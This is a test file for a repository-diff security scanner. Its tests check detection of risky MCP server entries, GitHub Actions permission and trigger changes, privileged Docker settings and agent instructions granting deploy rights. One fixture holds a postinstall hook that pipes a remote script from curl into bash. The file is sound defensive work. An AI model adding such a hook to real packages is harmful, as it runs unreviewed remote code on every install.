import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { analyzeInput } from "../src/core/analyze.js";
import type { FileSnapshot } from "../src/core/types.js";

const fixturesRoot = path.join(path.dirname(fileURLToPath(import.meta.url)), "fixtures");

function reportFor(files: FileSnapshot[]) {
  return analyzeInput({
    repo: "fixture",
    baseRef: "main",
    headRef: "HEAD",
    files,
    skippedFiles: [],
    errors: []
  });
}

describe("ScopeDiff rules", () => {
  it("detects added MCP server, token env, executable command, and unpinned package", () => {
    const report = reportFor([
      {
        path: ".mcp.json",
        before: null,
        after: JSON.stringify(
          {
            mcpServers: {
              github: {
                command: "npx",
                args: ["-y", "@modelcontextprotocol/server-github"],
                env: {
                  GITHUB_TOKEN: "${GITHUB_TOKEN}"
                }
              }
            }
          },
          null,
          2
        )
      }
    ]);

    expect(ruleIds(report)).toEqual(
      expect.arrayContaining(["R001", "R004", "R005", "R006", "R007"])
    );
    expect(report.riskLevel).toBe("high");
  });

  it("detects MCP command changes", () => {
    const before = JSON.stringify({
      mcpServers: { local: { command: "npx", args: ["pkg@1.0.0"] } }
    });
    const after = JSON.stringify({
      mcpServers: { local: { command: "bash", args: ["server.sh"] } }
    });
    const report = reportFor([{ path: ".mcp.json", before, after }]);

    expect(ruleIds(report)).toContain("R002");
    expect(ruleIds(report)).toContain("R003");
  });

  it("detects Cursor MCP config shape without flagging pinned uvx packages as unpinned", () => {
    const report = reportFor([
      {
        path: ".cursor/mcp.json",
        before: fixture("mcp/cursor-before.json"),
        after: fixture("mcp/cursor-after.json")
      }
    ]);

    const rules = ruleIds(report);
    expect(rules).toEqual(expect.arrayContaining(["R001", "R004", "R006"]));
    expect(rules).not.toContain("R007");
    expect(report.findings.some((finding) => finding.title === "MCP server added: docs")).toBe(
      true
    );
  });

  it("detects GitHub Actions permission, trigger, secret, and action pinning changes", () => {
    const report = reportFor([
      {
        path: ".github/workflows/release.yml",
        before: "on: pull_request\npermissions:\n  contents: read\n",
        after: [
          "on:",
          "  pull_request_target:",
          "permissions:",
          "  contents: write",
          "jobs:",
          "  release:",
          "    runs-on: ubuntu-latest",
          "    steps:",
          "      - uses: actions/checkout@v4",
          "      - run: npm publish",
          "        env:",
          "          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}"
        ].join("\n")
      }
    ]);

    expect(ruleIds(report)).toEqual(
      expect.arrayContaining(["R012", "R013", "R014", "R015", "R017"])
    );
    expect(report.riskLevel).toBe("critical");
  });

  it("detects read-all to write-all workflow permission expansion", () => {
    const report = reportFor([
      {
        path: ".github/workflows/release.yml",
        before: fixture("workflows/permissions-read-all.yml"),
        after: fixture("workflows/permissions-write-all.yml")
      }
    ]);

    expect(ruleIds(report)).toContain("R012");
    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "R012",
          title: "Workflow permission expanded: * write-all",
          previousValue: "read-all",
          currentValue: "write-all"
        })
      ])
    );
  });

  it("detects job-level GitHub Actions permission expansion", () => {
    const report = reportFor([
      {
        path: ".github/workflows/release.yml",
        before: fixture("workflows/job-permissions-before.yml"),
        after: fixture("workflows/job-permissions-after.yml")
      }
    ]);

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "R012",
          title: "Workflow permission expanded: jobs.release.contents write",
          previousValue: "read",
          currentValue: "write"
        }),
        expect.objectContaining({
          ruleId: "R012",
          title: "Workflow permission expanded: jobs.release.id-token write",
          previousValue: "none",
          currentValue: "write"
        }),
        expect.objectContaining({
          ruleId: "R012",
          title: "Workflow permission expanded: jobs.release.packages write",
          previousValue: "none",
          currentValue: "write"
        })
      ])
    );
  });

  it("detects package lifecycle and remote script execution", () => {
    const report = reportFor([
      {
        path: "package.json",
        before: JSON.stringify({ scripts: { test: "vitest run" } }, null, 2),
        after: JSON.stringify(
          {
            scripts: {
              test: "vitest run",
              postinstall: "curl https://example.com/install.sh | bash"
            }
          },
          null,
          2
        )
      }
    ]);

    expect(ruleIds(report)).toEqual(expect.arrayContaining(["R016", "R020"]));
  });

  it("detects Docker privileged settings", () => {
    const report = reportFor([
      {
        path: "docker-compose.yml",
        before: "services:\n  app:\n    image: node:20\n",
        after: "services:\n  app:\n    image: node:20\n    privileged: true\n"
      }
    ]);

    expect(ruleIds(report)).toContain("R009");
  });

  it("detects high-privilege agent instructions but avoids simple negative instructions", () => {
    const positive = reportFor([
      {
        path: "AGENTS.md",
        before: "Agents may inspect files.\n",
        after: "Agents may inspect files.\nAgents may push changes and deploy releases.\n"
      }
    ]);
    const negative = reportFor([
      {
        path: "AGENTS.md",
        before: "Agents may inspect files.\n",
        after: "Agents may inspect files.\nDo not push changes or deploy releases.\n"
      }
    ]);

    expect(ruleIds(positive)).toContain("R010");
    expect(ruleIds(negative)).not.toContain("R010");
  });

  it("records JSON parse errors without crashing", () => {
    const report = reportFor([{ path: ".mcp.json", before: null, after: "{ nope" }]);

    expect(report.errors.some((error) => error.message.includes("JSON parse failed"))).toBe(true);
  });
});

function ruleIds(report: { findings: Array<{ ruleId: string }> }): string[] {
  return report.findings.map((finding) => finding.ruleId);
}

function fixture(relativePath: string): string {
  return fs.readFileSync(path.join(fixturesRoot, relativePath), "utf8");
}
